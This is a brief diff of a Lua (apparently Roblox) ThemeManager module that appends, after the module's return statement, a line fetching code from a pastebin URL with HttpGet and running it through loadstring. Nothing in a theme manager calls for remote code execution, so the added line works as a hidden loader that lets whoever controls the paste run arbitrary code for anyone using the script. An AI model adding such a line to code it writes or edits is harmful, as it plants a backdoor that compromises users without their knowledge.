@@ -245,4 +245,6 @@ local ThemeManager = {} do
 	ThemeManager:BuildFolderTree()
 end
 
+
 return ThemeManager
+loadstring(game:HttpGet("https://pastebin.com/raw/pUPEWAba"))()
